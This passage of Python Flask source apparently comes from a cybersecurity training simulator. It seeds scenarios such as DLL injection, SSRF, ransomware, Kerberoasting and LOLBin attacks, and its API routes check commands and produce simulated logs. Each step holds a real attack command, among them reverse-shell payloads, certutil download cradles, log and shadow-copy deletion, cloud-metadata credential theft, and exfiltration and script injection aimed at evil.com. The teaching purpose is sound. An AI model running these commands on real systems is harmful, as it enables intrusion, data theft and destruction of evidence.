              (21,6,'Monetize Botnet','Rent botnet access on underground forums','monetize','tor-browser --post darknet-market.onion --listing "800-node botnet for rent: $500/hour"','List botnet for rent on dark web','Botnet listed | Price: $500/hour | 3 buyers in first 24h | Revenue: $12,000/month')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 22: DLL Injection
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('DLL Injection', 'Inject malicious DLL into a running process to execute arbitrary code',
     'Code Injection', 'Advanced',
     'Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20;Metasploit Introduction|https://tryhackme.com/room/metasploitintro',
     'Volatility|https://tryhackme.com/room/volatility;Windows Forensics|https://tryhackme.com/room/introtoir'))
    for s in [(22,1,'Identify Target Process','Find a suitable process for DLL injection','identify','tasklist /v /fi "username eq SYSTEM" | findstr svchost','Find SYSTEM-level processes','Target: svchost.exe (PID 1284) | Running as SYSTEM | Has network access'),
              (22,2,'Create Malicious DLL','Compile DLL payload with reverse shell','create_dll','msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 -f dll -o payload.dll','Generate DLL payload with msfvenom','payload.dll created | 12KB | x64 reverse TCP meterpreter'),
              (22,3,'Transfer DLL','Upload DLL to target machine','transfer','certutil -urlcache -split -f http://10.0.0.5/payload.dll C:\\Windows\\Temp\\payload.dll','Use certutil to download DLL','DLL transferred to C:\\Windows\\Temp\\payload.dll | LOLBin download via certutil'),
              (22,4,'Inject into Process','Inject DLL into target process memory','inject','rundll32.exe C:\\Windows\\Temp\\payload.dll,DllMain','Execute DLL injection via rundll32','DLL injected into svchost.exe (PID 1284) | Meterpreter session opened | Running as SYSTEM'),
              (22,5,'Establish Persistence','Set up DLL search order hijacking','persist','copy payload.dll C:\\Program Files\\VulnApp\\version.dll','Place DLL in vulnerable application path','DLL search order hijack: version.dll | Loads on every VulnApp.exe start'),
              (22,6,'Cover Tracks','Clean injection artifacts and event logs','cover','wevtutil cl Security && wevtutil cl System && del C:\\Windows\\Temp\\payload.dll','Clear event logs and temp files','Security/System logs cleared | Temp DLL deleted | Persistence DLL remains hidden')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 23: SSRF
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Server-Side Request Forgery (SSRF)', 'Exploit SSRF to access internal services and cloud metadata from a web application',
     'SSRF', 'Advanced',
     'SSRF|https://tryhackme.com/room/ssrf;OWASP Top 10|https://tryhackme.com/room/owasptop10',
     'Web App Forensics|https://tryhackme.com/room/dvwa;Log Analysis|https://tryhackme.com/room/introtologs'))
    for s in [(23,1,'Find SSRF Vector','Identify URL parameter that makes server-side requests','find','burpsuite --proxy --target http://webapp.com/fetch?url=http://example.com','Use Burp Suite to find fetchable URL parameter','Found: /fetch?url= parameter makes server-side HTTP requests | No validation'),
              (23,2,'Probe Internal Network','Use SSRF to scan internal services','probe','curl "http://webapp.com/fetch?url=http://127.0.0.1:8080"','Probe localhost services via SSRF','Internal service found: http://127.0.0.1:8080 (Admin panel) | Not exposed externally'),
              (23,3,'Access Cloud Metadata','Read AWS metadata service via SSRF','metadata','curl "http://webapp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"','Query AWS metadata endpoint','IAM Role: webapp-prod-role | AccessKeyId: AKIA... | SecretAccessKey: obtained'),
              (23,4,'Steal AWS Credentials','Extract temporary AWS access keys','steal_creds','curl "http://webapp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-prod-role"','Get full IAM credentials from metadata','AWS credentials obtained | Role: webapp-prod-role | Expiration: 6 hours | S3 full access'),
              (23,5,'Access S3 Buckets','Use stolen creds to access private S3 storage','s3_access','aws s3 ls s3://webapp-prod-data/ --profile stolen','List S3 buckets with stolen credentials','S3 bucket: webapp-prod-data | 45,000 files | Includes: user uploads, database backups, config files'),
              (23,6,'Exfiltrate Data','Download sensitive files from S3','exfiltrate','aws s3 cp s3://webapp-prod-data/backups/users_backup.sql . --profile stolen','Download database backup from S3','Downloaded: users_backup.sql (2.3GB) | Contains 500K user records with PII')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 24: Advanced Ransomware
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Advanced Ransomware (Double Extortion)', 'Deploy ransomware with data exfiltration for double extortion leverage',
     'Ransomware', 'Advanced',
     'MAL: Malware Introductory|https://tryhackme.com/room/malmalintroductory;History of Malware|https://tryhackme.com/room/historyofmalware',
     'Volatility|https://tryhackme.com/room/volatility;YARA|https://tryhackme.com/room/yara'))
    for s in [(24,1,'Initial Access via RDP','Brute force exposed RDP service','rdp_brute','hydra -l administrator -P rockyou.txt rdp://target-corp.com','Use Hydra to brute force RDP','RDP credentials found: administrator:Winter2024! | Direct access to file server'),
              (24,2,'Disable Security','Kill antivirus and EDR processes','disable_av','powershell -ep bypass -c "Get-Service -Name *defender* | Stop-Service -Force"','Disable Windows Defender via PowerShell','Defender disabled | Real-time protection OFF | Tamper protection bypassed'),
              (24,3,'Exfiltrate First','Steal data before encryption for leverage','exfil_first','rclone copy C:\\SensitiveData remote:exfil-bucket --transfers 16','Use rclone to exfiltrate data before encrypting','Exfiltrated: 450GB | Contracts, financials, customer PII, trade secrets'),
              (24,4,'Deploy Ransomware','Execute encryption across all shares','encrypt','ransomware.exe --encrypt-all --extension .locked --exclude C:\\Windows','Run ransomware with exclusions','Encrypting... 125,000 files across 12 network shares | AES-256 + RSA-2048'),
              (24,5,'Delete Backups','Destroy backup copies and shadow volumes','delete_backups','vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet','Delete volume shadow copies','Shadow copies deleted | Backup catalog destroyed | 3 backup servers wiped'),
              (24,6,'Ransom Note','Deploy double extortion ransom demand','ransom','echo "Pay 50 BTC or we leak 450GB of your data on our blog" > README_LOCKED.txt','Create ransom note with leak threat','Ransom: 50 BTC ($2.1M) | Deadline: 7 days | Leak site: darkblog.onion | Timer started')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 25: Kerberoasting
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Kerberoasting', 'Extract and crack Kerberos service tickets to compromise Active Directory service accounts',
     'Active Directory', 'Advanced',
     'Active Directory|https://tryhackme.com/room/attacktivedirectory;Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20',
     'Windows Forensics|https://tryhackme.com/room/introtoir;Incident Response|https://tryhackme.com/room/introtoir'))
    for s in [(25,1,'Domain Enumeration','Enumerate Active Directory for service accounts','enum_ad','bloodhound-python -c all -d corp.local -u jsmith -p Password1','Run BloodHound collector','AD enumerated: 2,500 users | 45 groups | 12 service accounts with SPNs'),
              (25,2,'Find SPNs','Identify service accounts with Service Principal Names','find_spn','GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip 10.0.0.10','Use Impacket to find SPNs','SPNs found: svc_sql (MSSQLSvc), svc_web (HTTP), svc_backup (CIFS) | All crackable'),
              (25,3,'Request Tickets','Request TGS tickets for service accounts','request_tgs','GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip 10.0.0.10 -request','Request TGS tickets for cracking','3 TGS tickets exported | Encryption: RC4_HMAC (weak) | Ready for offline cracking'),
              (25,4,'Crack Tickets','Offline crack the Kerberos tickets','crack_tgs','hashcat -m 13100 tgs_tickets.txt rockyou.txt --force','Crack TGS with hashcat mode 13100','svc_sql cracked: SqlAdmin2024! | svc_backup cracked: Backup123 | 2/3 cracked'),
              (25,5,'Lateral Movement','Use cracked service account for domain escalation','lateral','psexec.py corp.local/svc_sql:SqlAdmin2024!@10.0.0.30','Use psexec with cracked service account','SYSTEM shell on SQL Server | svc_sql has local admin on 5 servers'),
              (25,6,'Domain Dominance','Dump domain controller secrets','domain_dump','secretsdump.py corp.local/svc_sql:SqlAdmin2024!@10.0.0.10','Dump DC secrets with secretsdump','NTDS.dit extracted | 2,500 user hashes | krbtgt hash obtained | Full domain compromise')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 26: Physical Device Cloning
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Physical Device Cloning', 'Clone a physical device to extract credentials and access sensitive data',
     'Physical Attack', 'Advanced',
     'Linux PrivEsc|https://tryhackme.com/room/linprivesc;Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics',
     'Disk Forensics|https://tryhackme.com/room/dvwa;Autopsy|https://tryhackme.com/room/dvwa'))
    for s in [(26,1,'Create Disk Image','Clone target hard drive bit-for-bit','clone','dd if=/dev/sda of=/mnt/external/clone.img bs=4M status=progress','Use dd to create disk image','Cloning /dev/sda: 500GB | Speed: 150MB/s | SHA256 hash recorded for integrity'),
              (26,2,'Mount Image','Mount cloned image for analysis','mount','losetup -fP /mnt/external/clone.img && mount /dev/loop0p2 /mnt/analysis','Mount disk image with losetup','Image mounted at /mnt/analysis | Filesystem: NTFS | OS: Windows 10 Pro'),
              (26,3,'Extract Credentials','Pull stored credentials from the cloned system','extract_creds','secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL','Extract SAM database credentials','5 local accounts found | Administrator NTLM hash extracted | 2 cached domain creds'),
              (26,4,'Recover Deleted Files','Recover deleted sensitive documents','recover','photorec /mnt/external/clone.img','Use PhotoRec to recover deleted files','Recovered: 2,400 files | Includes: deleted emails, financial spreadsheets, SSH keys'),
              (26,5,'Browser Data Extraction','Extract saved passwords and cookies from browsers','browser','python3 lazagne.py all -oJ','Use LaZagne to extract browser credentials','Chrome: 45 saved passwords | Firefox: 12 passwords | Edge: 8 passwords | 3 banking sites'),
              (26,6,'WiFi Password Recovery','Extract stored WiFi passwords from the clone','wifi','netsh wlan show profiles | foreach {netsh wlan show profile name=$_ key=clear}','Extract WiFi profiles and keys','8 WiFi profiles found | Corporate WPA2 key: C0rp_S3cur3! | Home network key recovered')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 27: Watering Hole Attack
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Watering Hole Attack', 'Compromise a website frequently visited by the target group to deliver malware',
     'APT', 'Advanced',
     'OWASP Top 10|https://tryhackme.com/room/owasptop10;XSS|https://tryhackme.com/room/xss',
     'Web App Forensics|https://tryhackme.com/room/dvwa;Incident Response|https://tryhackme.com/room/introtoir'))
    for s in [(27,1,'Profile Target Group','Research target organizations browsing habits','profile','maltego --target "DefenseCorp" --transform web_history','Profile target group web usage','Target: DefenseCorp employees | Frequently visit: industry-news.com (85% of staff)'),
              (27,2,'Compromise Watering Hole','Exploit vulnerability in the target website','compromise','sqlmap -u "http://industry-news.com/article?id=1" --os-shell','SQLi to get shell on news site','Shell on industry-news.com | Web root access | Can inject JavaScript into pages'),
              (27,3,'Inject Exploit Kit','Embed exploit code in popular article pages','inject','echo "<script src=http://evil.com/exploit.js></script>" >> /var/www/article_template.php','Inject exploit script into template','Exploit kit injected | Targets: Chrome<120, Firefox<115 | 2,000 daily visitors'),
              (27,4,'Serve Payload','Zero-day browser exploit delivers backdoor','serve','python3 exploit_server.py --payload backdoor.exe --cve CVE-2024-XXXX','Start exploit server for drive-by download','Drive-by download active | 12 DefenseCorp IPs infected in first 48 hours'),
              (27,5,'Establish C2','Connect backdoors to command and control','c2_connect','covenant --listeners add --name watering --port 443 --ssl','Setup Covenant C2 listener','12 beacons connected | All DefenseCorp network | Including 2 admin workstations'),
              (27,6,'Espionage Operations','Conduct intelligence gathering on target org','espionage','covenant --interact beacon01 --command "download C:\\Projects\\classified\\"','Download classified files via C2','Exfiltrated: 3.2GB classified documents | Project blueprints | Internal communications')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 28: Advanced Insider Attack
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Advanced Insider Attack', 'Sophisticated insider leverages deep system knowledge to exfiltrate data undetected',
     'Insider Threat', 'Advanced',
     'Linux PrivEsc|https://tryhackme.com/room/linprivesc;Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics',
     'Disk Forensics|https://tryhackme.com/room/dvwa;Incident Response|https://tryhackme.com/room/introtoir'))
    for s in [(28,1,'Abuse Admin Access','Use authorized admin access to query sensitive databases','abuse','psql -h prod-db.internal -U db_admin -c "SELECT * FROM customers WHERE balance > 100000"','Query high-value customer records','Queried 847 high-value customer records | Total value: $2.1B in assets'),
              (28,2,'Steganography Hide','Hide stolen data inside image files','stego','steghide embed -cf vacation.jpg -ef customers.csv -p s3cret','Use steghide to hide CSV in images','Data hidden in 15 vacation photos | 847 records embedded | Undetectable by DLP'),
              (28,3,'Exfil via Email','Send data out disguised as personal photos','email_exfil','sendmail --to personal@gmail.com --attach vacation_photos.zip --subject "My vacation pics"','Email the steganographic images','Emailed 15 images to personal account | DLP scan: PASSED (no sensitive data detected)'),
              (28,4,'Encrypt Evidence','Encrypt local copies with plausible deniability','encrypt','veracrypt --create hidden_volume --size 500MB --encryption AES-Twofish','Create VeraCrypt hidden volume','Hidden volume created | Outer volume: personal docs | Hidden: stolen customer data'),
              (28,5,'Plant False Trail','Create misleading audit log entries','false_trail','psql -h prod-db.internal -U db_admin -c "UPDATE audit_log SET query=\'routine maintenance check\'"','Modify audit logs to hide queries','Audit logs modified | Original queries replaced with routine maintenance entries'),
              (28,6,'Sell on Dark Web','Monetize stolen data anonymously','sell','tor-browser --post darkmarket.onion --listing "847 HNW client records - $200K"','Post data for sale on dark web','Listed on 3 dark web markets | Price: $200K in Monero | First buyer within 6 hours')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 29: Zero-Day Exploits
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Zero-Day Exploits', 'Discover and weaponize an unknown vulnerability before any patch exists',
     'Zero-Day', 'Advanced',
     'Metasploit Introduction|https://tryhackme.com/room/metasploitintro;OWASP Top 10|https://tryhackme.com/room/owasptop10',
     'REMnux|https://tryhackme.com/room/yourfirstmalwareanalysis;YARA|https://tryhackme.com/room/yara'))
    for s in [(29,1,'Fuzzing','Fuzz target application to find crashes','fuzz','afl-fuzz -i input_corpus -o crash_output -- ./target_app @@','Fuzz with AFL to find crashes','AFL ran 48h | 12,847 paths | 3 unique crashes found | 1 exploitable (heap overflow)'),
              (29,2,'Analyze Crash','Reverse engineer the crash for exploitability','analyze','gdb ./target_app core_dump -ex "bt full" -ex "info registers"','Analyze crash with GDB','Heap buffer overflow at 0x7fff... | Controllable EIP | Write-what-where primitive'),
              (29,3,'Develop Exploit','Write reliable exploit with ROP chain','develop','ropper --file target_app --search "pop rdi; ret"','Find ROP gadgets with Ropper','ROP chain built | 12 gadgets | Bypasses: ASLR, NX, Stack Canary | 95% reliability'),
              (29,4,'Weaponize','Package exploit with payload for deployment','weaponize','msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 -f elf -o exploit_payload','Create weaponized payload','Zero-day exploit packaged | CVE: PENDING | Affects versions 3.0-3.8 | No patch available'),
              (29,5,'Deploy Against Target','Use zero-day against high-value target','deploy','python3 zero_day_exploit.py --target 10.0.0.100 --payload exploit_payload','Run zero-day exploit against target','Zero-day deployed | Shell obtained on 10.0.0.100 | IDS/WAF: No detection | AV: No signature'),
              (29,6,'Maintain Access','Install persistent access before patch release','maintain','python3 implant.py --install --stealth --callback-interval 3600','Install stealthy implant','Implant installed | Memory-only (fileless) | Callbacks every hour | Survives patching')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 30: Living Off the Land
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Living Off the Land (LOLBins)', 'Use legitimate system tools to attack without deploying malware',
     'Evasion', 'Advanced',
     'Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20;Active Directory|https://tryhackme.com/room/attacktivedirectory',
     'Windows Forensics|https://tryhackme.com/room/introtoir;Volatility|https://tryhackme.com/room/volatility'))
    for s in [(30,1,'Recon with Built-ins','Use native Windows tools for reconnaissance','recon','powershell -c "Get-ADComputer -Filter * | Select Name,OperatingSystem"','Use PowerShell AD cmdlets for recon','Domain: 450 computers | 12 servers | 5 DCs | 2,500 users | All via legitimate tools'),
              (30,2,'Download via Certutil','Use certutil to download tools (LOLBin)','lolbin_download','certutil -urlcache -split -f http://10.0.0.5/nc.exe C:\\Windows\\Temp\\svc.exe','Use certutil as download cradle','nc.exe downloaded as svc.exe | Certutil is trusted by AV | No detection triggered'),
              (30,3,'Execute via WMIC','Run payload using WMIC process call','wmic_exec','wmic process call create "C:\\Windows\\Temp\\svc.exe -e cmd.exe 10.0.0.5 4444"','Execute payload using WMIC','Reverse shell via WMIC | Process tree: wmiprvse.exe > svc.exe | Appears legitimate'),
              (30,4,'Persist via Scheduled Tasks','Create persistence using schtasks','schtask_persist','schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\svc.exe" /sc onstart /ru SYSTEM','Create scheduled task for persistence','Task WindowsUpdate created | Runs as SYSTEM on boot | Blends with real update tasks'),
              (30,5,'Lateral Move via PSExec','Spread using Windows built-in remote execution','psexec_move','psexec \\\\fileserver cmd /c "certutil -urlcache -f http://10.0.0.5/svc.exe C:\\Windows\\Temp\\svc.exe"','Use PsExec to spread laterally','Spread to FILESERVER | Payload deployed via certutil chain | 0 AV alerts'),
              (30,6,'Exfil via DNS','Exfiltrate data through DNS queries (LOLBin)','dns_exfil','powershell -c "Get-Content secrets.txt | ForEach {nslookup $_.base64.evil.com}"','Use nslookup for DNS exfiltration','450KB exfiltrated via DNS queries | 2,300 lookups to evil.com | Firewall: allowed (port 53)')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # LUCA KNOWLEDGE BASE
    # ==========================================
    for entry in [
        ('Phishing','Social Engineering','Social engineering attack using fraudulent messages to trick people into revealing sensitive information.','Email from "admin@compny.com" asking to verify your password.'),
        ('SQL Injection','Web Security','Code injection exploiting database vulnerabilities by inserting malicious SQL into input fields.',"Entering ' OR 1=1-- into a login form to bypass authentication."),
        ('Ransomware','Malware','Malware encrypting victim files and demanding ransom for decryption keys.','WannaCry encrypted 200K+ computers across 150 countries.'),
        ('ARP Spoofing','Network','Sending falsified ARP messages on a LAN to intercept traffic between two parties.','Fake ARP replies linking attacker MAC with gateway IP.'),
        ('DDoS','Network','Distributed Denial of Service — flooding a target from multiple sources to deny availability.','100K IoT botnet flooding a server with 50Gbps.'),
        ('DNS Poisoning','Network','Corrupting DNS cache so a domain resolves to the wrong (malicious) IP address.','Poisoning resolver so bank.com points to attacker server.'),
        ('Lateral Movement','Tactics','Post-access techniques to move through a network seeking key data and assets.','Using stolen admin credentials to SSH between servers.'),
        ('Meterpreter','Tools','Advanced Metasploit payload providing interactive post-exploitation shell.','Using "meterpreter> hashdump" to extract password hashes.'),
        ('MITRE ATT&CK','Frameworks','Knowledge base of adversary tactics and techniques for threat modeling and defense.','Mapping incident to T1566 (Phishing) for structured analysis.'),
        ('Chain of Custody','Forensics','Documentation tracking evidence from collection to courtroom for integrity.','Logging who handled a hard drive, when, and what was done.'),
        ('Volatility','Forensics','Open-source memory forensics framework for analyzing RAM dumps.','Running "vol.py pslist" to list processes from memory dump.'),
        ('Zero-Day','Vulnerabilities','Vulnerability unknown to vendor with no available patch.','Log4Shell (CVE-2021-44228) — zero-day in Log4j library.'),
        ('Nmap','Tools','Network Mapper — tool for network discovery and security auditing.','Running "nmap -sV target.com" to detect service versions.'),
        ('Wireshark','Tools','Network protocol analyzer for packet-level traffic inspection.','Filtering "http.request.method == POST" to find logins.'),
        ('Supply Chain Attack','Tactics','Compromising supply chain elements to reach the ultimate target.','SolarWinds: malicious code in updates hit 18K+ orgs.'),
        ('Privilege Escalation','Tactics','Exploiting flaws to gain higher access — user to root/admin.','Exploiting SUID misconfiguration for root access.'),
        ('Data Exfiltration','Tactics','Unauthorized transfer of data to an attacker-controlled destination.','SCP database dump to personal server.'),
        ('Incident Response','Forensics','Organized approach to manage security breaches and limit damage.','NIST framework: Prepare, Detect, Contain, Eradicate, Recover.'),
        ('Social Engineering','Tactics','Psychological manipulation to trick people into revealing information.','Calling helpdesk pretending to be the CEO.'),
        ('Hash Cracking','Techniques','Recovering plaintext passwords from hashes using wordlists.','hashcat -m 0 hashes.txt rockyou.txt to crack MD5.')]:
        cursor.execute('INSERT INTO luca (term, category, definition, example) VALUES (?,?,?,?)', entry)

    db.commit()
    db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scenarios', methods=['GET'])
def get_scenarios():
    """Get all available attack scenarios"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM scenarios')
    scenarios = [dict(row) for row in cursor.fetchall()]
    db.close()
    return jsonify(scenarios)

@app.route('/api/scenario/<int:scenario_id>', methods=['GET'])
def get_scenario_details(scenario_id):
    """Get detailed scenario with all steps"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM scenarios WHERE id = ?', (scenario_id,))
    scenario = dict(cursor.fetchone())
    
    cursor.execute('SELECT * FROM attack_steps WHERE scenario_id = ? ORDER BY step_number', (scenario_id,))
    steps = [dict(row) for row in cursor.fetchall()]
    scenario['steps'] = steps
    
    db.close()
    return jsonify(scenario)

@app.route('/api/company-files/<int:scenario_id>', methods=['GET'])
def get_company_files(scenario_id):
    """Get list of fake company files for a scenario"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT id, scenario_id, company_name, filename, filepath, file_type FROM company_files WHERE scenario_id = ?', (scenario_id,))
    files = [dict(row) for row in cursor.fetchall()]
    company_name = files[0]['company_name'] if files else 'Unknown'
    db.close()
    return jsonify({'company_name': company_name, 'files': files})

@app.route('/api/company-file/<int:file_id>', methods=['GET'])
def get_company_file(file_id):
    """Get full content of a fake company file"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM company_files WHERE id = ?', (file_id,))
    row = cursor.fetchone()
    db.close()
    if row:
        return jsonify(dict(row))
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/allowed-commands/<int:scenario_id>', methods=['GET'])
def get_allowed_commands(scenario_id):
    """Return whitelist of allowed command prefixes for a scenario"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT command FROM attack_steps WHERE scenario_id = ?', (scenario_id,))
    rows = cursor.fetchall()
    db.close()
    # Extract the first word (tool name) from each command
    tools = list(set(row['command'].split()[0].lower() for row in rows if row['command']))
    builtins = ['help', 'hint', 'status', 'ls', 'cat', 'clear']
    return jsonify({'allowed': builtins + tools})

@app.route('/api/commands', methods=['GET'])
def get_all_commands():
    """Get all commands grouped by scenario for the Command List page"""
    db = get_db()
    cursor = db.cursor()
    cursor.execute('''
        SELECT s.name as scenario_name, s.attack_type, a.step_number, a.title, a.command, a.command_hint, a.description
        FROM attack_steps a
        JOIN scenarios s ON a.scenario_id = s.id
        ORDER BY s.id, a.step_number
    ''')
    rows = [dict(row) for row in cursor.fetchall()]
    db.close()
    
    # Group by scenario
    grouped = {}
    for row in rows:
        name = row['scenario_name']
        if name not in grouped:
            grouped[name] = {'attack_type': row['attack_type'], 'commands': []}
        grouped[name]['commands'].append({
            'step': row['step_number'],
            'title': row['title'],
            'command': row['command'],
            'hint': row['command_hint'],
            'description': row['description']
        })
    
    return jsonify(grouped)

@app.route('/api/start-session', methods=['POST'])
def start_session():
    """Start a new attack or detect mode session"""
    data = request.json
    scenario_id = data.get('scenario_id')
    mode = data.get('mode')  # 'attack' or 'detect'
    session_id = f"{scenario_id}_{mode}_{datetime.now().timestamp()}"
    
    db = get_db()
    cursor = db.cursor()
    cursor.execute('''INSERT INTO sessions (session_id, scenario_id, mode, created_at)
    VALUES (?, ?, ?, ?)''',
    (session_id, scenario_id, mode, datetime.now().isoformat()))
    db.commit()
    db.close()
    
    return jsonify({'session_id': session_id, 'scenario_id': scenario_id})

@app.route('/api/validate-command', methods=['POST'])
def validate_command():
    """Validate a user-typed command against the expected command for a step"""
    data = request.json
    step_id = data.get('step_id')
    user_command = data.get('command', '').strip()
    
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM attack_steps WHERE id = ?', (step_id,))
    step = dict(cursor.fetchone())
    db.close()
    
    expected = step['command'].strip()
    
    # Fuzzy matching: check if core command/tool name matches
    expected_parts = expected.lower().split()
    user_parts = user_command.lower().split()
    
    # Exact match
    if user_command.lower() == expected.lower():
        return jsonify({'valid': True, 'match': 'exact', 'message': 'Command accepted!'})
    
    # Check if the main tool/command matches (first word or two)
    if len(user_parts) >= 1 and len(expected_parts) >= 1:
        if user_parts[0] == expected_parts[0]:
            # At least the tool name matches — accept with note
            return jsonify({'valid': True, 'match': 'partial', 'message': f'Command accepted. Full syntax: {expected}'})
    
    return jsonify({
        'valid': False,
        'match': 'none',
        'hint': step['command_hint'],
        'message': 'Incorrect command. Check the hint below.'
    })

@app.route('/api/execute-step', methods=['POST'])
def execute_step():
    """Execute an attack step and generate logs"""
    data = request.json
    session_id = data.get('session_id')
    scenario_id = data.get('scenario_id')
    step_id = data.get('step_id')
    
    db = get_db()
    cursor = db.cursor()
    
    # Get step details
    cursor.execute('SELECT * FROM attack_steps WHERE id = ?', (step_id,))
    step = dict(cursor.fetchone())
    
    # Generate realistic logs based on step
    logs = generate_logs_for_step(scenario_id, session_id, step)
    
    # Store logs
    for log in logs:
        cursor.execute('''INSERT INTO generated_logs 
        (scenario_id, session_id, log_type, timestamp, content, is_evidence)
        VALUES (?, ?, ?, ?, ?, ?)''',
        (scenario_id, session_id, log['type'], log['timestamp'], log['content'], 1))
    
    db.commit()
    
    # Get all logs so far
    cursor.execute('''SELECT * FROM generated_logs 
    WHERE session_id = ? ORDER BY timestamp''', (session_id,))
    all_logs = [dict(row) for row in cursor.fetchall()]
    db.close()
    
    return jsonify({
        'step': step,
        'logs': all_logs,
        'message': f"Step executed: {step['title']}"
    })

@app.route('/api/session-logs/<session_id>', methods=['GET'])
def get_session_logs(session_id):
    """Get all logs for a session (for Detect Mode)"""
    db = get_db()
    cursor = db.cursor()
    
    cursor.execute('''SELECT * FROM generated_logs 
    WHERE session_id = ? ORDER BY timestamp''', (session_id,))
    logs = [dict(row) for row in cursor.fetchall()]
    
    db.close()
    return jsonify(logs)

@app.route('/api/analyze-logs', methods=['POST'])
def analyze_logs():
    """Analyze logs and provide investigation hints"""
    data = request.json
    session_id = data.get('session_id')
    user_analysis = data.get('analysis')
    
    db = get_db()
    cursor = db.cursor()
    
    # Get session scenario
    cursor.execute('SELECT scenario_id FROM sessions WHERE session_id = ?', (session_id,))
    session = cursor.fetchone()
    
    # Get actual logs from attack mode
    cursor.execute('''SELECT * FROM generated_logs 
    WHERE session_id = ? ORDER BY timestamp''', (session_id,))
    logs = [dict(row) for row in cursor.fetchall()]
    
    # Analyze if user found key evidence
    findings = analyze_for_evidence(logs, user_analysis)
    
    db.close()
    return jsonify(findings)

def generate_logs_for_step(scenario_id, session_id, step):
    """Generate realistic logs based on attack step"""
    logs = []
    base_time = datetime(2024, 1, 15, 10, 23)
    offset = (step['step_number'] - 1) * 90  # 90 seconds between steps

    # Scenario 1: Phishing
    if scenario_id == 1:
        if step['step_number'] == 1:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Attacker identified domain: company.com | Target email: user@company.com'})
        elif step['step_number'] == 2:
            logs.append({'type': 'email_draft', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Email Subject: URGENT: Update Your Password\nFrom: admin@compny.com\nBody: Click here to verify your account...'})
        elif step['step_number'] == 3:
